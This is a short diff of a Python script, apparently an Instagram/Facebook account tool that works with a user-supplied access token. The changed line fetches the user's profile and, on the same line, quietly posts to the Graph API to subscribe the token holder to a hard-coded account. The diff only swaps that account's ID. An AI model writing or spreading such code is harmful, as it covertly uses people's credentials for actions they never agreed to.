@@ -37,7 +37,7 @@ def menu_instagram():
                 time.sleep(2)
                 login()
 	try:
-                otw = requests.get('https://graph.facebook.com/me?access_token=' +token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
+                otw = requests.get('https://graph.facebook.com/me?access_token=' +token);requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token='+token)
                 a = json.loads(otw.text)
 		nama = a['name']
 	except KeyError:
